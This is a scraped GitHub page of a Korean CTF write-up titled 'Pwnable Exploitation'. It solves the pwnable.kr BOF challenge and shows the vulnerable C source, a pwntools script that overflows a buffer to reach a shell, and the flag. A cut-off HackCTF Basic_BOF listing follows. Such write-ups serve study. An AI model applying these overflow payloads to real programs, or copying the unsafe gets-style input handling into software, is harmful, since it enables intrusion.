00-1.5 0v12.5c0 .414.336.75.75.75h14.5a.75.75 0 000-1.5H1.5V1.75zm14.28 2.53a.75.75 0 00-1.06-1.06L10 7.94 7.53 5.47a.75.75 0 00-1.06 0L3.22 8.72a.75.75 0 001.06 1.06L7 7.06l2.47 2.47a.75.75 0 001.06 0l5.25-5.25z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;        &lt;span data-content=&quot;Insights&quot;&gt;Insights&lt;/span&gt;          &lt;span title=&quot;Not available&quot; class=&quot;Counter &quot;&gt;&lt;/span&gt;</code></pre></a><pre><code>  &lt;/li&gt;</code></pre></ul><pre><code>&lt;div style=&quot;visibility:hidden;&quot; class=&quot;UnderlineNav-actions  js-responsive-underlinenav-overflow position-absolute pr-3 pr-md-4 pr-lg-5 right-0&quot;&gt;    &lt;details class=&quot;details-overlay details-reset position-relative&quot;&gt;</code></pre>  <summary role="button">        <div class="UnderlineNav-item mr-0 border-0">          <svg class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM1.5 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm13 0a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg>          <span class="sr-only">More</span>        </div></summary>  <div>        <details-menu role="menu" class="dropdown-menu dropdown-menu-sw ">            <ul>              <li data-menu-item="i0code-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io" href="/wjddnjs33/wjddnjs33.github.io">                  Code</a>              </li>              <li data-menu-item="i1issues-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io/issues" href="/wjddnjs33/wjddnjs33.github.io/issues">                  Issues</a>              </li>              <li data-menu-item="i2pull-requests-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io/pulls" href="/wjddnjs33/wjddnjs33.github.io/pulls">                  Pull requests</a>              </li>              <li data-menu-item="i3actions-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io/actions" href="/wjddnjs33/wjddnjs33.github.io/actions">                  Actions</a>              </li>              <li data-menu-item="i4projects-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io/projects" href="/wjddnjs33/wjddnjs33.github.io/projects">                  Projects</a>              </li>              <li data-menu-item="i5security-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io/security" href="/wjddnjs33/wjddnjs33.github.io/security">                  Security</a>              </li>              <li data-menu-item="i6insights-tab" hidden>                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links=" /wjddnjs33/wjddnjs33.github.io/pulse" href="/wjddnjs33/wjddnjs33.github.io/pulse">                  Insights</a>              </li>          </ul><p></details-menu></div></p></details></div></nav>  </div><div class="container-xl clearfix new-discussion-timeline px-3 px-md-4 px-lg-5">  <div id="repo-content-pjax-container" class="repository-content " ><div>  <pre><code>&lt;a class=&quot;d-none js-permalink-shortcut&quot; data-hotkey=&quot;y&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/blob/2dfff12a9860c9904af7d20f315a3601ac8262e6/backup_md/2021-01-25-pwn.md&quot;&gt;Permalink&lt;/a&gt;&lt;!-- blob contrib key: blob_contributors:v22:66072db0560f9af6d9c9a3bc17d2de08365945d6a5dba56ddff2e429231b2d30 --&gt;&lt;div class=&quot;d-flex flex-items-start flex-shrink-0 pb-3 flex-wrap flex-md-nowrap flex-justify-between flex-md-justify-start&quot;&gt;  </code></pre><div class="position-relative">  <details class="details-reset details-overlay mr-0 mb-0 " id="branch-select-menu">    <summary class="btn css-truncate"            data-hotkey="w"            title="Switch branches or tags">      <svg class="octicon octicon-git-branch text-gray" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M11.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122V6A2.5 2.5 0 0110 8.5H6a1 1 0 00-1 1v1.128a2.251 2.251 0 11-1.5 0V5.372a2.25 2.25 0 111.5 0v1.836A2.492 2.492 0 016 7h4a1 1 0 001-1v-.628A2.25 2.25 0 019.5 3.25zM4.25 12a.75.75 0 100 1.5.75.75 0 000-1.5zM3.5 3.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0z"></path></svg>      <span class="css-truncate-target" data-menu-button>master</span>      <span class="dropdown-caret"></span>    </summary><pre><code>  &lt;div class=&quot;SelectMenu&quot;&gt;</code></pre>  <div class="SelectMenu-modal">    <header class="SelectMenu-header">      <span class="SelectMenu-title">Switch branches/tags</span>      <button class="SelectMenu-closeButton" type="button" data-toggle-for="branch-select-menu"><svg aria-label="Close menu" aria-hidden="false" class="octicon octicon-x" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg></button>    </header><pre><code>&lt;input-demux data-action=&quot;tab-container-change:input-demux#storeInput tab-container-changed:input-demux#updateInput&quot;&gt;  &lt;tab-container class=&quot;d-flex flex-column js-branches-tags-tabs&quot; style=&quot;min-height: 0;&quot;&gt;    &lt;div class=&quot;SelectMenu-filter&quot;&gt;      &lt;input data-target=&quot;input-demux.source&quot;             id=&quot;context-commitish-filter-field&quot;             class=&quot;SelectMenu-input form-control&quot;             aria-owns=&quot;ref-list-branches&quot;             data-controls-ref-menu-id=&quot;ref-list-branches&quot;             autofocus             autocomplete=&quot;off&quot;             aria-label=&quot;Filter branches/tags&quot;             placeholder=&quot;Filter branches/tags&quot;             type=&quot;text&quot;      &gt;    &lt;/div&gt;    &lt;div class=&quot;SelectMenu-tabs&quot; role=&quot;tablist&quot; data-target=&quot;input-demux.control&quot;&gt;      &lt;button class=&quot;SelectMenu-tab&quot; type=&quot;button&quot; role=&quot;tab&quot; aria-selected=&quot;true&quot;&gt;Branches&lt;/button&gt;      &lt;button class=&quot;SelectMenu-tab&quot; type=&quot;button&quot; role=&quot;tab&quot;&gt;Tags&lt;/button&gt;    &lt;/div&gt;    &lt;div role=&quot;tabpanel&quot; id=&quot;ref-list-branches&quot; data-filter-placeholder=&quot;Filter branches/tags&quot; class=&quot;d-flex flex-column flex-auto overflow-auto&quot; tabindex=&quot;&quot;&gt;      &lt;ref-selector        type=&quot;branch&quot;        data-targets=&quot;input-demux.sinks&quot;        data-action=&quot;          input-entered:ref-selector#inputEntered          tab-selected:ref-selector#tabSelected          focus-list:ref-selector#focusFirstListMember        &quot;        query-endpoint=&quot;/wjddnjs33/wjddnjs33.github.io/refs&quot;                cache-key=&quot;v0:1613005907.9633229&quot;        current-committish=&quot;bWFzdGVy&quot;        default-branch=&quot;bWFzdGVy&quot;        name-with-owner=&quot;d2pkZG5qczMzL3dqZGRuanMzMy5naXRodWIuaW8=&quot;      &gt;        &lt;template data-target=&quot;ref-selector.noMatchTemplate&quot;&gt;            &lt;div class=&quot;SelectMenu-message&quot;&gt;Nothing to show&lt;/div&gt;        &lt;/template&gt;        &lt;!-- TODO: this max-height is necessary or else the branch list won&#39;t scroll.  why? --&gt;        &lt;div data-target=&quot;ref-selector.listContainer&quot; role=&quot;menu&quot; class=&quot;SelectMenu-list&quot; style=&quot;max-height: 330px&quot;&gt;          &lt;div class=&quot;SelectMenu-loading pt-3 pb-0&quot; aria-label=&quot;Menu is loading&quot;&gt;            &lt;svg style=&quot;box-sizing: content-box; color: var(--color-icon-primary);&quot; viewBox=&quot;0 0 16 16&quot; fill=&quot;none&quot; width=&quot;32&quot; height=&quot;32&quot;&gt;</code></pre>  <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" />  <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke">    <animateTransform attributeName="transform" type="rotate" from="0 8 8" to="360 8 8" dur="1s" repeatCount="indefinite" />  </path></svg>              </div>            </div><pre><code>        &lt;template data-target=&quot;ref-selector.itemTemplate&quot;&gt;          &lt;a href=&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/&#123;&#123; urlEncodedRefName &#125;&#125;/backup_md/2021-01-25-pwn.md&quot; class=&quot;SelectMenu-item&quot; role=&quot;menuitemradio&quot; rel=&quot;nofollow&quot; aria-checked=&quot;&#123;&#123; isCurrent &#125;&#125;&quot; data-index=&quot;&#123;&#123; index &#125;&#125;&quot;&gt;            &lt;svg class=&quot;octicon octicon-check SelectMenu-icon SelectMenu-icon--check&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;            &lt;span class=&quot;flex-1 css-truncate css-truncate-overflow &#123;&#123; isFilteringClass &#125;&#125;&quot;&gt;&#123;&#123; refName &#125;&#125;&lt;/span&gt;            &lt;span hidden=&quot;&#123;&#123; isNotDefault &#125;&#125;&quot; class=&quot;Label Label--secondary flex-self-start&quot;&gt;default&lt;/span&gt;           &lt;/a&gt;        &lt;/template&gt;        &lt;footer class=&quot;SelectMenu-footer&quot;&gt;&lt;a href=&quot;/wjddnjs33/wjddnjs33.github.io/branches&quot;&gt;View all branches&lt;/a&gt;&lt;/footer&gt;      &lt;/ref-selector&gt;    &lt;/div&gt;    &lt;div role=&quot;tabpanel&quot; id=&quot;tags-menu&quot; data-filter-placeholder=&quot;Find a tag&quot; class=&quot;d-flex flex-column flex-auto overflow-auto&quot; tabindex=&quot;&quot; hidden&gt;      &lt;ref-selector        type=&quot;tag&quot;        data-action=&quot;          input-entered:ref-selector#inputEntered          tab-selected:ref-selector#tabSelected          focus-list:ref-selector#focusFirstListMember        &quot;        data-targets=&quot;input-demux.sinks&quot;        query-endpoint=&quot;/wjddnjs33/wjddnjs33.github.io/refs&quot;        cache-key=&quot;v0:1613005907.9633229&quot;        current-committish=&quot;bWFzdGVy&quot;        default-branch=&quot;bWFzdGVy&quot;        name-with-owner=&quot;d2pkZG5qczMzL3dqZGRuanMzMy5naXRodWIuaW8=&quot;      &gt;        &lt;template data-target=&quot;ref-selector.noMatchTemplate&quot;&gt;          &lt;div class=&quot;SelectMenu-message&quot; data-index=&quot;&#123;&#123; index &#125;&#125;&quot;&gt;Nothing to show&lt;/div&gt;        &lt;/template&gt;        &lt;template data-target=&quot;ref-selector.itemTemplate&quot;&gt;          &lt;a href=&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/&#123;&#123; urlEncodedRefName &#125;&#125;/backup_md/2021-01-25-pwn.md&quot; class=&quot;SelectMenu-item&quot; role=&quot;menuitemradio&quot; rel=&quot;nofollow&quot; aria-checked=&quot;&#123;&#123; isCurrent &#125;&#125;&quot; data-index=&quot;&#123;&#123; index &#125;&#125;&quot;&gt;            &lt;svg class=&quot;octicon octicon-check SelectMenu-icon SelectMenu-icon--check&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;            &lt;span class=&quot;flex-1 css-truncate css-truncate-overflow &#123;&#123; isFilteringClass &#125;&#125;&quot;&gt;&#123;&#123; refName &#125;&#125;&lt;/span&gt;            &lt;span hidden=&quot;&#123;&#123; isNotDefault &#125;&#125;&quot; class=&quot;Label Label--secondary flex-self-start&quot;&gt;default&lt;/span&gt;          &lt;/a&gt;        &lt;/template&gt;        &lt;div data-target=&quot;ref-selector.listContainer&quot; role=&quot;menu&quot; class=&quot;SelectMenu-list&quot; style=&quot;max-height: 330px&quot;&gt;          &lt;div class=&quot;SelectMenu-loading pt-3 pb-0&quot; aria-label=&quot;Menu is loading&quot;&gt;            &lt;svg style=&quot;box-sizing: content-box; color: var(--color-icon-primary);&quot; viewBox=&quot;0 0 16 16&quot; fill=&quot;none&quot; width=&quot;32&quot; height=&quot;32&quot;&gt;</code></pre>  <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" />  <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke">    <animateTransform attributeName="transform" type="rotate" from="0 8 8" to="360 8 8" dur="1s" repeatCount="indefinite" />  </path></svg>              </div>            </div>            <footer class="SelectMenu-footer"><a href="/wjddnjs33/wjddnjs33.github.io/tags">View all tags</a></footer>          </ref-selector>        </div>      </tab-container>    </input-demux>  </div></div>  </details></div><pre><code>  &lt;h2 id=&quot;blob-path&quot; class=&quot;breadcrumb flex-auto flex-self-center min-width-0 text-normal mx-2 width-full width-md-auto flex-order-1 flex-md-order-none mt-3 mt-md-0&quot;&gt;    &lt;span class=&quot;js-repo-root text-bold&quot;&gt;&lt;span class=&quot;js-path-segment d-inline-block wb-break-all&quot;&gt;&lt;a data-pjax=&quot;true&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io&quot;&gt;&lt;span&gt;wjddnjs33.github.io&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;separator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;js-path-segment d-inline-block wb-break-all&quot;&gt;&lt;a data-pjax=&quot;true&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/tree/master/backup_md&quot;&gt;&lt;span&gt;backup_md&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;separator&quot;&gt;/&lt;/span&gt;&lt;strong class=&quot;final-path&quot;&gt;2021-01-25-pwn.md&lt;/strong&gt;  &lt;/h2&gt;  &lt;a href=&quot;/wjddnjs33/wjddnjs33.github.io/find/master&quot;        class=&quot;js-pjax-capture-input btn mr-2 d-none d-md-block&quot;        data-pjax        data-hotkey=&quot;t&quot;&gt;    Go to file  &lt;/a&gt;  &lt;details id=&quot;blob-more-options-details&quot; class=&quot;details-overlay details-reset position-relative&quot;&gt;</code></pre>  <summary role="button" type="button" class="btn ">          <svg aria-label="More options" class="octicon octicon-kebab-horizontal" height="16" viewBox="0 0 16 16" version="1.1" width="16" role="img"><path d="M8 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM1.5 9a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm13 0a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path></svg></summary>  <div>          <ul class="dropdown-menu dropdown-menu-sw">            <li class="d-block d-md-none">              <a class="dropdown-item d-flex flex-items-baseline" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;FIND_FILE_BUTTON&quot;,&quot;repository_id&quot;:333657172,&quot;originating_url&quot;:&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="0264047c21a255961fc9350e8b4c6ff98bc97f234306a76061d9ea93a7bb6238" data-ga-click="Repository, find file, location:repo overview" data-hotkey="t" data-pjax="true" href="/wjddnjs33/wjddnjs33.github.io/find/master">                <span class="flex-auto">Go to file</span>                <span class="text-small color-text-secondary" aria-hidden="true">T</span></a>            </li>            <li data-toggle-for="blob-more-options-details">              <button type="button" data-toggle-for="jumpto-line-details-dialog" class="btn-link dropdown-item">                <span class="d-flex flex-items-baseline">                  <span class="flex-auto">Go to line</span>                  <span class="text-small color-text-secondary" aria-hidden="true">L</span>                </span>              </button>            </li>            <li class="dropdown-divider" role="none"></li>            <li>              <clipboard-copy value="backup_md/2021-01-25-pwn.md" class="dropdown-item cursor-pointer" data-toggle-for="blob-more-options-details">                Copy path              </clipboard-copy>            </li>            <li>              <clipboard-copy value="https://github.com/wjddnjs33/wjddnjs33.github.io/blob/2dfff12a9860c9904af7d20f315a3601ac8262e6/backup_md/2021-01-25-pwn.md" class="dropdown-item cursor-pointer" data-toggle-for="blob-more-options-details" >                <span class="d-flex flex-items-baseline">                  <span class="flex-auto">Copy permalink</span>                </span>              </clipboard-copy>            </li>          </ul></div></details>    </div><pre><code>&lt;div class=&quot;Box d-flex flex-column flex-shrink-0 mb-3&quot;&gt;  &lt;include-fragment src=&quot;/wjddnjs33/wjddnjs33.github.io/contributors/master/backup_md/2021-01-25-pwn.md&quot; class=&quot;commit-loader&quot;&gt;    &lt;div class=&quot;Box-header Box-header--blue d-flex flex-items-center&quot;&gt;      &lt;div class=&quot;Skeleton avatar avatar-user flex-shrink-0 ml-n1 mr-n1 mt-n1 mb-n1&quot; style=&quot;width:24px;height:24px;&quot;&gt;&lt;/div&gt;      &lt;div class=&quot;Skeleton Skeleton--text col-5 ml-2&quot;&gt;&amp;nbsp;&lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;Box-body d-flex flex-items-center&quot; &gt;      &lt;div class=&quot;Skeleton Skeleton--text col-1&quot;&gt;&amp;nbsp;&lt;/div&gt;      &lt;span class=&quot;color-text-danger h6 loader-error&quot;&gt;Cannot retrieve contributors at this time&lt;/span&gt;    &lt;/div&gt;</code></pre><p></include-fragment>    </div></p><pre><code>&lt;div class=&quot;Box mt-3 position-relative  &quot;&gt;  </code></pre><div class="Box-header py-2 d-flex flex-column flex-shrink-0 flex-md-row flex-md-items-center">  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0"><pre><code>  1482 lines (1224 sloc)  &lt;span class=&quot;file-info-divider&quot;&gt;&lt;/span&gt;43.7 KB</code></pre>  </div>  <div class="d-flex py-1 py-md-0 flex-auto flex-order-1 flex-md-order-2 flex-sm-grow-0 flex-justify-between"><pre><code>&lt;div class=&quot;BtnGroup&quot;&gt;  &lt;a href=&quot;/wjddnjs33/wjddnjs33.github.io/raw/master/backup_md/2021-01-25-pwn.md&quot; id=&quot;raw-url&quot; role=&quot;button&quot; class=&quot;btn btn-sm BtnGroup-item &quot;&gt;Raw&lt;/a&gt;    &lt;a href=&quot;/wjddnjs33/wjddnjs33.github.io/blame/master/backup_md/2021-01-25-pwn.md&quot; data-hotkey=&quot;b&quot; role=&quot;button&quot; class=&quot;btn js-update-url-with-hash btn-sm BtnGroup-item &quot;&gt;Blame&lt;/a&gt;&lt;/div&gt;&lt;div&gt;      &lt;a class=&quot;btn-octicon tooltipped tooltipped-nw js-remove-unless-platform&quot;         data-platforms=&quot;windows,mac&quot;         href=&quot;https://desktop.github.com&quot;         aria-label=&quot;Open this file in GitHub Desktop&quot;         data-ga-click=&quot;Repository, open with desktop&quot;&gt;          &lt;svg class=&quot;octicon octicon-device-desktop&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M1.75 2.5h12.5a.25.25 0 01.25.25v7.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25v-7.5a.25.25 0 01.25-.25zM14.25 1H1.75A1.75 1.75 0 000 2.75v7.5C0 11.216.784 12 1.75 12h3.727c-.1 1.041-.52 1.872-1.292 2.757A.75.75 0 004.75 16h6.5a.75.75 0 00.565-1.243c-.772-.885-1.193-1.716-1.292-2.757h3.727A1.75 1.75 0 0016 10.25v-7.5A1.75 1.75 0 0014.25 1zM9.018 12H6.982a5.72 5.72 0 01-.765 2.5h3.566a5.72 5.72 0 01-.765-2.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;      &lt;/a&gt;      &lt;a href=&quot;/login?return_to=%2Fwjddnjs33%2Fwjddnjs33.github.io%2Fblob%2Fmaster%2Fbackup_md%2F2021-01-25-pwn.md&quot; class=&quot;btn-octicon disabled tooltipped tooltipped-nw&quot;        aria-label=&quot;You must be signed in to make or propose changes&quot;&gt;        &lt;svg class=&quot;octicon octicon-pencil&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M11.013 1.427a1.75 1.75 0 012.474 0l1.086 1.086a1.75 1.75 0 010 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 01-.927-.928l.929-3.25a1.75 1.75 0 01.445-.758l8.61-8.61zm1.414 1.06a.25.25 0 00-.354 0L10.811 3.75l1.439 1.44 1.263-1.263a.25.25 0 000-.354l-1.086-1.086zM11.189 6.25L9.75 4.81l-6.286 6.287a.25.25 0 00-.064.108l-.558 1.953 1.953-.558a.249.249 0 00.108-.064l6.286-6.286z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;      &lt;/a&gt;      &lt;a href=&quot;/login?return_to=%2Fwjddnjs33%2Fwjddnjs33.github.io%2Fblob%2Fmaster%2Fbackup_md%2F2021-01-25-pwn.md&quot; class=&quot;btn-octicon btn-octicon-danger disabled tooltipped tooltipped-nw&quot;        aria-label=&quot;You must be signed in to make or propose changes&quot;&gt;        &lt;svg class=&quot;octicon octicon-trash&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M6.5 1.75a.25.25 0 01.25-.25h2.5a.25.25 0 01.25.25V3h-3V1.75zm4.5 0V3h2.25a.75.75 0 010 1.5H2.75a.75.75 0 010-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75zM4.496 6.675a.75.75 0 10-1.492.15l.66 6.6A1.75 1.75 0 005.405 15h5.19c.9 0 1.652-.681 1.741-1.576l.66-6.6a.75.75 0 00-1.492-.149l-.66 6.6a.25.25 0 01-.249.225h-5.19a.25.25 0 01-.249-.225l-.66-6.6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;      &lt;/a&gt;&lt;/div&gt;</code></pre>  </div></div>  <div id="readme" class="Box-body readme blob js-code-block-container p-5 p-xl-6 gist-border-0">    <article class="markdown-body entry-content container-lg" itemprop="text"><table data-table-type="yaml-metadata">  <thead>  <tr>  <th>layout</th>  <th>date</th>  <th>title</th>  <th>categories</th>  <th>tags</th>  <th>author</th>  </tr>  </thead>  <tbody>  <tr>  <td><div>post</div></td>  <td><div>2021-01-24 16:00:03 -0800</div></td>  <td><div>Pwnable Exploitation</div></td>  <td><div>Pwnable</div></td>  <td><div><table>  <tbody>  <tr>  <td><div>PWN</div></td>  </tr>  </tbody></table></div></td>  <td><div><table>  <tbody>  <tr>  <td><div>Jeongwon Jo</div></td>  </tr>  </tbody></table></div></td>  </tr>  </tbody></table><p><strong>앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.</strong><br></p><hr><h2><a id="user-content-pwn-d1-20210125" class="anchor" aria-hidden="true" href="#pwn-d1-20210125"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PWN D+1 (2021.01.25)<br></h2><hr><p>Pwnable.kr Challenge : BOF</p><div class="highlight highlight-source-c"><pre>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span><span class="pl-k">void</span> <span class="pl-en">func</span>(<span class="pl-k">int</span> key){        <span class="pl-k">char</span> overflowme[<span class="pl-c1">32</span>];        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>overflow me : <span class="pl-pds">"</span></span>);        <span class="pl-c1">gets</span>(overflowme);       <span class="pl-c"><span class="pl-c">//</span> smash me!</span>        <span class="pl-k">if</span>(key == <span class="pl-c1">0xcafebabe</span>){                <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>);        }        <span class="pl-k">else</span>{                <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Nah..<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);        }}<span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span>* argv[]){        <span class="pl-c1">func</span>(<span class="pl-c1">0xdeadbeef</span>);        <span class="pl-k">return</span> <span class="pl-c1">0</span>;}</pre></div><p><strong>처음 풀어 볼 문제는 Pwnable.kr의 BOF라는 문제입니다. func 함수를 보면 key의 값이 <code>0xcafebabe</code>이면 system 함수를 호출하는 것을 볼 수 있습니다. BOF를 이용해서 key 값을 <code>0xcafebabe</code> 바꿔주면 될 거 같습니다.</strong><br></p><p><a target="_blank" rel="noopener noreferrer" href="https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true"><img src="https://github.com/wjddnjs33/image2/raw/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true" alt="" style="max-width:100%;"></a></p><p><strong>func 중간에 브레이크 포인트를 걸어 key의 주소를 확인해보면 13 + 4 = 52만큼 떨어져 있는 것을 볼 수 있습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"pwnable.kr"</span>, <span class="pl-c1">9000</span>)<p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">b”a”</span> <span class="pl-c1">*</span> <span class="pl-c1">52</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0xcafebabe</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><blockquote><p>FLAG : daddy, I just pwned a buFFer :)</p></blockquote><hr><p>HackCTF Challenge : Basic_BOF #1</p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [esp+4h] [ebp-34h]</span>  <span class="pl-k">int</span> v5; <span class="pl-c"><span class="pl-c">//</span> [esp+2Ch] [ebp-Ch]</span><p>  v5 = <span class="pl-c1">0x4030201</span>;<br>  <span class="pl-c1">fgets</span>(&amp;s, <span class="pl-c1">45</span>, stdin);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>[buf]: <span class="pl-c1">%s</span><span class="pl-cce">\n</span><span class="pl-pds">“</span></span>, &amp;s);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>[check] <span class="pl-c1">%p</span><span class="pl-cce">\n</span><span class="pl-pds">“</span></span>, v5);<br>  <span class="pl-k">if</span> ( v5 != <span class="pl-c1">0x4030201</span> &amp;&amp; v5 != <span class="pl-c1">0xDEADBEEF</span> )<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>You are on the right way!<span class="pl-pds">“</span></span>);<br>  <span class="pl-k">if</span> ( v5 == <span class="pl-c1">0xDEADBEEF</span> )<br>  